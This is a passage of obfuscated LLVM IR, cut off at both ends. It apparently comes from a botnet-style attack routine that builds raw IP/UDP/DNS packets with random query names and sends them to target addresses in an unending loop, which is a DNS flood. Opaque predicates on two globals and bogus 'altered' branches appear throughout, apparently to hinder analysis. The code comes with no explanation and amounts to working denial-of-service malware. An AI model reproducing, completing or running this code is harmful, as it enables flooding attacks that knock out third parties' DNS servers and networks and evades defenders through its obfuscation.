  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %144

; <label>:144:                                    ; preds = %originalBBpart2119, %originalBBpart28
  %145 = load i32, i32* %9, align 4
  %146 = load i8, i8* %5, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp slt i32 %145, %147
  br i1 %148, label %149, label %388

; <label>:149:                                    ; preds = %144
  %150 = load i32, i32* @x.37
  %151 = load i32, i32* @y.38
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %149
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %158 = call noalias i8* @calloc(i64 600, i64 1) #6
  %159 = load i8**, i8*** %11, align 8
  %160 = load i32, i32* %9, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds i8*, i8** %159, i64 %161
  store i8* %158, i8** %162, align 8
  %163 = load i8**, i8*** %11, align 8
  %164 = load i32, i32* %9, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds i8*, i8** %163, i64 %165
  %167 = load i8*, i8** %166, align 8
  %168 = bitcast i8* %167 to %struct.iphdr*
  store %struct.iphdr* %168, %struct.iphdr** %26, align 8
  %169 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i64 1
  %171 = bitcast %struct.iphdr* %170 to %struct.udphdr*
  store %struct.udphdr* %171, %struct.udphdr** %27, align 8
  %172 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %173 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %172, i64 1
  %174 = bitcast %struct.udphdr* %173 to %struct.dnshdr*
  store %struct.dnshdr* %174, %struct.dnshdr** %28, align 8
  %175 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %176 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %175, i64 1
  %177 = bitcast %struct.dnshdr* %176 to i8*
  store i8* %177, i8** %29, align 8
  %178 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %179 = bitcast %struct.iphdr* %178 to i8*
  %180 = load i8, i8* %179, align 4
  %181 = and i8 %180, 15
  %182 = or i8 %181, 64
  store i8 %182, i8* %179, align 4
  %183 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %184 = bitcast %struct.iphdr* %183 to i8*
  %185 = load i8, i8* %184, align 4
  %186 = and i8 %185, -16
  %187 = or i8 %186, 5
  store i8 %187, i8* %184, align 4
  %188 = load i8, i8* %12, align 1
  %189 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 1
  store i8 %188, i8* %190, align 1
  %191 = load i8, i8* %19, align 1
  %192 = zext i8 %191 to i64
  %193 = add i64 41, %192
  %194 = add i64 %193, 2
  %195 = load i32, i32* %21, align 4
  %196 = sext i32 %195 to i64
  %197 = add i64 %194, %196
  %198 = add i64 %197, 4
  %199 = trunc i64 %198 to i16
  %200 = call zeroext i16 @htons(i16 zeroext %199) #7
  %201 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 2
  store i16 %200, i16* %202, align 2
  %203 = load i16, i16* %13, align 2
  %204 = call zeroext i16 @htons(i16 zeroext %203) #7
  %205 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 3
  store i16 %204, i16* %206, align 4
  %207 = load i8, i8* %14, align 1
  %208 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 5
  store i8 %207, i8* %209, align 4
  %210 = load i8, i8* %15, align 1
  %211 = icmp ne i8 %210, 0
  %212 = load i32, i32* @x.37
  %213 = load i32, i32* @y.38
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBBpart256, label %originalBB10alteredBB

originalBBpart256:                                ; preds = %originalBB10
  br i1 %211, label %220, label %224

; <label>:220:                                    ; preds = %originalBBpart256
  %221 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %222 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i32 0, i32 4
  store i16 %221, i16* %223, align 2
  br label %224

; <label>:224:                                    ; preds = %220, %originalBBpart256
  %225 = load i32, i32* @x.37
  %226 = load i32, i32* @y.38
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %224
  %233 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 6
  store i8 17, i8* %234, align 1
  %235 = load i32, i32* @LOCAL_ADDR, align 4
  %236 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i32 0, i32 8
  store i32 %235, i32* %237, align 4
  %238 = load i32, i32* %22, align 4
  %239 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %240 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %239, i32 0, i32 9
  store i32 %238, i32* %240, align 4
  %241 = load i16, i16* %16, align 2
  %242 = call zeroext i16 @htons(i16 zeroext %241) #7
  %243 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %244 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %243, i32 0, i32 0
  store i16 %242, i16* %244, align 2
  %245 = load i16, i16* %17, align 2
  %246 = call zeroext i16 @htons(i16 zeroext %245) #7
  %247 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %248 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %247, i32 0, i32 1
  store i16 %246, i16* %248, align 2
  %249 = load i8, i8* %19, align 1
  %250 = zext i8 %249 to i64
  %251 = add i64 21, %250
  %252 = add i64 %251, 2
  %253 = load i32, i32* %21, align 4
  %254 = sext i32 %253 to i64
  %255 = add i64 %252, %254
  %256 = add i64 %255, 4
  %257 = trunc i64 %256 to i16
  %258 = call zeroext i16 @htons(i16 zeroext %257) #7
  %259 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %260 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %259, i32 0, i32 2
  store i16 %258, i16* %260, align 2
  %261 = load i16, i16* %18, align 2
  %262 = call zeroext i16 @htons(i16 zeroext %261) #7
  %263 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %264 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %263, i32 0, i32 0
  store i16 %262, i16* %264, align 2
  %265 = call zeroext i16 @htons(i16 zeroext 256) #7
  %266 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %267 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %266, i32 0, i32 1
  store i16 %265, i16* %267, align 2
  %268 = call zeroext i16 @htons(i16 zeroext 1) #7
  %269 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %270 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %269, i32 0, i32 2
  store i16 %268, i16* %270, align 2
  %271 = load i8, i8* %19, align 1
  %272 = load i8*, i8** %29, align 8
  %273 = getelementptr inbounds i8, i8* %272, i32 1
  store i8* %273, i8** %29, align 8
  store i8 %271, i8* %272, align 1
  %274 = load i8, i8* %19, align 1
  %275 = zext i8 %274 to i32
  %276 = load i8*, i8** %29, align 8
  %277 = sext i32 %275 to i64
  %278 = getelementptr inbounds i8, i8* %276, i64 %277
  store i8* %278, i8** %29, align 8
  %279 = load i8*, i8** %29, align 8
  store i8* %279, i8** %30, align 8
  %280 = load i8*, i8** %29, align 8
  %281 = getelementptr inbounds i8, i8* %280, i64 1
  %282 = load i8*, i8** %20, align 8
  %283 = load i32, i32* %21, align 4
  %284 = add nsw i32 %283, 1
  call void @util_memcpy(i8* %281, i8* %282, i32 %284)
  store i32 0, i32* %23, align 4
  %285 = load i32, i32* @x.37
  %286 = load i32, i32* @y.38
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBBpart299, label %originalBB58alteredBB

originalBBpart299:                                ; preds = %originalBB58
  br label %293

; <label>:293:                                    ; preds = %351, %originalBBpart299
  %294 = load i32, i32* @x.37
  %295 = load i32, i32* @y.38
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %293
  %302 = load i32, i32* %23, align 4
  %303 = load i32, i32* %21, align 4
  %304 = icmp slt i32 %302, %303
  %305 = load i32, i32* @x.37
  %306 = load i32, i32* @y.38
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br i1 %304, label %313, label %354

; <label>:313:                                    ; preds = %originalBBpart2103
  %314 = load i8*, i8** %20, align 8
  %315 = load i32, i32* %23, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds i8, i8* %314, i64 %316
  %318 = load i8, i8* %317, align 1
  %319 = sext i8 %318 to i32
  %320 = icmp eq i32 %319, 46
  br i1 %320, label %321, label %331

; <label>:321:                                    ; preds = %313
  %322 = load i8, i8* %24, align 1
  %323 = load i8*, i8** %30, align 8
  store i8 %322, i8* %323, align 1
  store i8 0, i8* %24, align 1
  %324 = load i8, i8* %25, align 1
  %325 = add i8 %324, 1
  store i8 %325, i8* %25, align 1
  %326 = load i8*, i8** %29, align 8
  %327 = load i32, i32* %23, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds i8, i8* %326, i64 %328
  %330 = getelementptr inbounds i8, i8* %329, i64 1
  store i8* %330, i8** %30, align 8
  br label %350

; <label>:331:                                    ; preds = %313
  %332 = load i32, i32* @x.37
  %333 = load i32, i32* @y.38
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %331
  %340 = load i8, i8* %24, align 1
  %341 = add i8 %340, 1
  store i8 %341, i8* %24, align 1
  %342 = load i32, i32* @x.37
  %343 = load i32, i32* @y.38
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBBpart2112, label %originalBB105alteredBB

originalBBpart2112:                               ; preds = %originalBB105
  br label %350

; <label>:350:                                    ; preds = %originalBBpart2112, %321
  br label %351

; <label>:351:                                    ; preds = %350
  %352 = load i32, i32* %23, align 4
  %353 = add nsw i32 %352, 1
  store i32 %353, i32* %23, align 4
  br label %293

; <label>:354:                                    ; preds = %originalBBpart2103
  %355 = load i8, i8* %24, align 1
  %356 = load i8*, i8** %30, align 8
  store i8 %355, i8* %356, align 1
  %357 = load i8*, i8** %29, align 8
  %358 = load i32, i32* %21, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds i8, i8* %357, i64 %359
  %361 = getelementptr inbounds i8, i8* %360, i64 2
  %362 = bitcast i8* %361 to %struct.grehdr*
  store %struct.grehdr* %362, %struct.grehdr** %31, align 8
  %363 = call zeroext i16 @htons(i16 zeroext 1) #7
  %364 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %365 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %364, i32 0, i32 0
  store i16 %363, i16* %365, align 2
  %366 = call zeroext i16 @htons(i16 zeroext 1) #7
  %367 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %368 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %367, i32 0, i32 1
  store i16 %366, i16* %368, align 2
  br label %369

; <label>:369:                                    ; preds = %354
  %370 = load i32, i32* @x.37
  %371 = load i32, i32* @y.38
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %369
  %378 = load i32, i32* %9, align 4
  %379 = add nsw i32 %378, 1
  store i32 %379, i32* %9, align 4
  %380 = load i32, i32* @x.37
  %381 = load i32, i32* @y.38
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBBpart2119, label %originalBB114alteredBB

originalBBpart2119:                               ; preds = %originalBB114
  br label %144

; <label>:388:                                    ; preds = %144
  br label %389

; <label>:389:                                    ; preds = %603, %388
  %390 = load i32, i32* @x.37
  %391 = load i32, i32* @y.38
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBB121, label %originalBB121alteredBB

originalBB121:                                    ; preds = %originalBB121alteredBB, %389
  store i32 0, i32* %9, align 4
  %398 = load i32, i32* @x.37
  %399 = load i32, i32* @y.38
  %400 = sub i32 %398, 1
  %401 = mul i32 %398, %400
  %402 = urem i32 %401, 2
  %403 = icmp eq i32 %402, 0
  %404 = icmp slt i32 %399, 10
  %405 = or i1 %403, %404
  br i1 %405, label %originalBBpart2123, label %originalBB121alteredBB

originalBBpart2123:                               ; preds = %originalBB121
  br label %406

; <label>:406:                                    ; preds = %600, %originalBBpart2123
  %407 = load i32, i32* %9, align 4
  %408 = load i8, i8* %5, align 1
  %409 = zext i8 %408 to i32
  %410 = icmp slt i32 %407, %409
  br i1 %410, label %411, label %603

; <label>:411:                                    ; preds = %406
  %412 = load i8**, i8*** %11, align 8
  %413 = load i32, i32* %9, align 4
  %414 = sext i32 %413 to i64
  %415 = getelementptr inbounds i8*, i8** %412, i64 %414
  %416 = load i8*, i8** %415, align 8
  store i8* %416, i8** %32, align 8
  %417 = load i8*, i8** %32, align 8
  %418 = bitcast i8* %417 to %struct.iphdr*
  store %struct.iphdr* %418, %struct.iphdr** %33, align 8
  %419 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i64 1
  %421 = bitcast %struct.iphdr* %420 to %struct.udphdr*
  store %struct.udphdr* %421, %struct.udphdr** %34, align 8
  %422 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %423 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %422, i64 1
  %424 = bitcast %struct.udphdr* %423 to %struct.dnshdr*
  store %struct.dnshdr* %424, %struct.dnshdr** %35, align 8
  %425 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %426 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %425, i64 1
  %427 = bitcast %struct.dnshdr* %426 to i8*
  %428 = getelementptr inbounds i8, i8* %427, i64 1
  store i8* %428, i8** %36, align 8
  %429 = load i16, i16* %13, align 2
  %430 = zext i16 %429 to i32
  %431 = icmp eq i32 %430, 65535
  br i1 %431, label %432, label %454

; <label>:432:                                    ; preds = %411
  %433 = load i32, i32* @x.37
  %434 = load i32, i32* @y.38
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBB125, label %originalBB125alteredBB

originalBB125:                                    ; preds = %originalBB125alteredBB, %432
  %441 = call i32 @rand_next()
  %442 = and i32 %441, 65535
  %443 = trunc i32 %442 to i16
  %444 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %445 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %444, i32 0, i32 3
  store i16 %443, i16* %445, align 4
  %446 = load i32, i32* @x.37
  %447 = load i32, i32* @y.38
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBBpart2131, label %originalBB125alteredBB

originalBBpart2131:                               ; preds = %originalBB125
  br label %454

; <label>:454:                                    ; preds = %originalBBpart2131, %411
  %455 = load i16, i16* %16, align 2
  %456 = zext i16 %455 to i32
  %457 = icmp eq i32 %456, 65535
  br i1 %457, label %458, label %480

; <label>:458:                                    ; preds = %454
  %459 = load i32, i32* @x.37
  %460 = load i32, i32* @y.38
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBB133, label %originalBB133alteredBB

originalBB133:                                    ; preds = %originalBB133alteredBB, %458
  %467 = call i32 @rand_next()
  %468 = and i32 %467, 65535
  %469 = trunc i32 %468 to i16
  %470 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %471 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %470, i32 0, i32 0
  store i16 %469, i16* %471, align 2
  %472 = load i32, i32* @x.37
  %473 = load i32, i32* @y.38
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBBpart2139, label %originalBB133alteredBB

originalBBpart2139:                               ; preds = %originalBB133
  br label %480

; <label>:480:                                    ; preds = %originalBBpart2139, %454
  %481 = load i32, i32* @x.37
  %482 = load i32, i32* @y.38
  %483 = sub i32 %481, 1
  %484 = mul i32 %481, %483
  %485 = urem i32 %484, 2
  %486 = icmp eq i32 %485, 0
  %487 = icmp slt i32 %482, 10
  %488 = or i1 %486, %487
  br i1 %488, label %originalBB141, label %originalBB141alteredBB

originalBB141:                                    ; preds = %originalBB141alteredBB, %480
  %489 = load i16, i16* %17, align 2
  %490 = zext i16 %489 to i32
  %491 = icmp eq i32 %490, 65535
  %492 = load i32, i32* @x.37
  %493 = load i32, i32* @y.38
  %494 = sub i32 %492, 1
  %495 = mul i32 %492, %494
  %496 = urem i32 %495, 2
  %497 = icmp eq i32 %496, 0
  %498 = icmp slt i32 %493, 10
  %499 = or i1 %497, %498
  br i1 %499, label %originalBBpart2143, label %originalBB141alteredBB

originalBBpart2143:                               ; preds = %originalBB141
  br i1 %491, label %500, label %506

; <label>:500:                                    ; preds = %originalBBpart2143
  %501 = call i32 @rand_next()
  %502 = and i32 %501, 65535
  %503 = trunc i32 %502 to i16
  %504 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %505 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %504, i32 0, i32 1
  store i16 %503, i16* %505, align 2
  br label %506

; <label>:506:                                    ; preds = %500, %originalBBpart2143
  %507 = load i16, i16* %18, align 2
  %508 = zext i16 %507 to i32
  %509 = icmp eq i32 %508, 65535
  br i1 %509, label %510, label %516

; <label>:510:                                    ; preds = %506
  %511 = call i32 @rand_next()
  %512 = and i32 %511, 65535
  %513 = trunc i32 %512 to i16
  %514 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %515 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %514, i32 0, i32 0
  store i16 %513, i16* %515, align 2
  br label %516

; <label>:516:                                    ; preds = %510, %506
  %517 = load i32, i32* @x.37
  %518 = load i32, i32* @y.38
  %519 = sub i32 %517, 1
  %520 = mul i32 %517, %519
  %521 = urem i32 %520, 2
  %522 = icmp eq i32 %521, 0
  %523 = icmp slt i32 %518, 10
  %524 = or i1 %522, %523
  br i1 %524, label %originalBB145, label %originalBB145alteredBB

originalBB145:                                    ; preds = %originalBB145alteredBB, %516
  %525 = load i8*, i8** %36, align 8
  %526 = load i8, i8* %19, align 1
  %527 = zext i8 %526 to i32
  call void @rand_alpha_str(i8* %525, i32 %527)
  %528 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %529 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %528, i32 0, i32 7
  store i16 0, i16* %529, align 2
  %530 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %531 = bitcast %struct.iphdr* %530 to i16*
  %532 = call zeroext i16 @checksum_generic(i16* %531, i32 20)
  %533 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %534 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %533, i32 0, i32 7
  store i16 %532, i16* %534, align 2
  %535 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %536 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %535, i32 0, i32 3
  store i16 0, i16* %536, align 2
  %537 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %538 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %539 = bitcast %struct.udphdr* %538 to i8*
  %540 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %541 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %540, i32 0, i32 2
  %542 = load i16, i16* %541, align 2
  %543 = load i8, i8* %19, align 1
  %544 = zext i8 %543 to i64
  %545 = add i64 21, %544
  %546 = add i64 %545, 2
  %547 = load i32, i32* %21, align 4
  %548 = sext i32 %547 to i64
  %549 = add i64 %546, %548
  %550 = add i64 %549, 4
  %551 = trunc i64 %550 to i32
  %552 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %537, i8* %539, i16 zeroext %542, i32 %551)
  %553 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %554 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %553, i32 0, i32 3
  store i16 %552, i16* %554, align 2
  %555 = load i32, i32* %22, align 4
  %556 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %557 = load i32, i32* %9, align 4
  %558 = sext i32 %557 to i64
  %559 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %556, i64 %558
  %560 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %559, i32 0, i32 0
  %561 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %560, i32 0, i32 2
  %562 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %561, i32 0, i32 0
  store i32 %555, i32* %562, align 4
  %563 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %564 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %563, i32 0, i32 1
  %565 = load i16, i16* %564, align 2
  %566 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %567 = load i32, i32* %9, align 4
  %568 = sext i32 %567 to i64
  %569 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %566, i64 %568
  %570 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %569, i32 0, i32 0
  %571 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %570, i32 0, i32 1
  store i16 %565, i16* %571, align 2
  %572 = load i32, i32* %10, align 4
  %573 = load i8*, i8** %32, align 8
  %574 = load i8, i8* %19, align 1
  %575 = zext i8 %574 to i64
  %576 = add i64 41, %575
  %577 = add i64 %576, 2
  %578 = load i32, i32* %21, align 4
  %579 = sext i32 %578 to i64
  %580 = add i64 %577, %579
  %581 = add i64 %580, 4
  %582 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %583 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %584 = load i32, i32* %9, align 4
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %583, i64 %585
  %587 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %586, i32 0, i32 0
  %588 = bitcast %struct.sockaddr_in* %587 to %struct.sockaddr*
  store %struct.sockaddr* %588, %struct.sockaddr** %582, align 8
  %589 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %590 = load %struct.sockaddr*, %struct.sockaddr** %589, align 8
  %591 = call i64 @sendto(i32 %572, i8* %573, i64 %581, i32 16384, %struct.sockaddr* %590, i32 16)
  %592 = load i32, i32* @x.37
  %593 = load i32, i32* @y.38
  %594 = sub i32 %592, 1
  %595 = mul i32 %592, %594
  %596 = urem i32 %595, 2
  %597 = icmp eq i32 %596, 0
  %598 = icmp slt i32 %593, 10
  %599 = or i1 %597, %598
  br i1 %599, label %originalBBpart2189, label %originalBB145alteredBB

originalBBpart2189:                               ; preds = %originalBB145
  br label %600

; <label>:600:                                    ; preds = %originalBBpart2189
  %601 = load i32, i32* %9, align 4
  %602 = add nsw i32 %601, 1
  store i32 %602, i32* %9, align 4
  br label %406

; <label>:603:                                    ; preds = %406
  br label %389

; <label>:604:                                    ; preds = %originalBBpart24, %102, %originalBBpart2
  %605 = load i32, i32* @x.37
  %606 = load i32, i32* @y.38
  %607 = sub i32 %605, 1
  %608 = mul i32 %605, %607
  %609 = urem i32 %608, 2
  %610 = icmp eq i32 %609, 0
  %611 = icmp slt i32 %606, 10
  %612 = or i1 %610, %611
  br i1 %612, label %originalBB191, label %originalBB191alteredBB

originalBB191:                                    ; preds = %originalBB191alteredBB, %604
  %613 = load i32, i32* @x.37
  %614 = load i32, i32* @y.38
  %615 = sub i32 %613, 1
  %616 = mul i32 %613, %615
  %617 = urem i32 %616, 2
  %618 = icmp eq i32 %617, 0
  %619 = icmp slt i32 %614, 10
  %620 = or i1 %618, %619
  br i1 %620, label %originalBBpart2193, label %originalBB191alteredBB

originalBBpart2193:                               ; preds = %originalBB191
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %80
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %108
  %621 = load i32, i32* %10, align 4
  %622 = call i32 @close(i32 %621)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %127
  store i32 0, i32* %9, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %149
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %623 = call noalias i8* @calloc(i64 600, i64 1) #6
  %624 = load i8**, i8*** %11, align 8
  %625 = load i32, i32* %9, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds i8*, i8** %624, i64 %626
  store i8* %623, i8** %627, align 8
  %628 = load i8**, i8*** %11, align 8
  %629 = load i32, i32* %9, align 4
  %630 = sext i32 %629 to i64
  %631 = getelementptr inbounds i8*, i8** %628, i64 %630
  %632 = load i8*, i8** %631, align 8
  %633 = bitcast i8* %632 to %struct.iphdr*
  store %struct.iphdr* %633, %struct.iphdr** %26, align 8
  %634 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %635 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %634, i64 1
  %636 = bitcast %struct.iphdr* %635 to %struct.udphdr*
  store %struct.udphdr* %636, %struct.udphdr** %27, align 8
  %637 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %638 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %637, i64 1
  %639 = bitcast %struct.udphdr* %638 to %struct.dnshdr*
  store %struct.dnshdr* %639, %struct.dnshdr** %28, align 8
  %640 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %641 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %640, i64 1
  %642 = bitcast %struct.dnshdr* %641 to i8*
  store i8* %642, i8** %29, align 8
  %643 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %644 = bitcast %struct.iphdr* %643 to i8*
  %645 = load i8, i8* %644, align 4
  %_ = sub i8 0, %645
  %gen = add i8 %_, 15
  %_11 = sub i8 %645, 15
  %gen12 = mul i8 %_11, 15
  %_13 = sub i8 0, %645
  %gen14 = add i8 %_13, 15
  %_15 = sub i8 %645, 15
  %gen16 = mul i8 %_15, 15
  %_17 = sub i8 0, %645
  %gen18 = add i8 %_17, 15
  %646 = and i8 %645, 15
  %_19 = sub i8 0, %646
  %gen20 = add i8 %_19, 64
  %_21 = sub i8 %646, 64
  %gen22 = mul i8 %_21, 64
  %_23 = shl i8 %646, 64
  %_24 = sub i8 0, %646
  %gen25 = add i8 %_24, 64
  %647 = or i8 %646, 64
  store i8 %647, i8* %644, align 4
  %648 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %649 = bitcast %struct.iphdr* %648 to i8*
  %650 = load i8, i8* %649, align 4
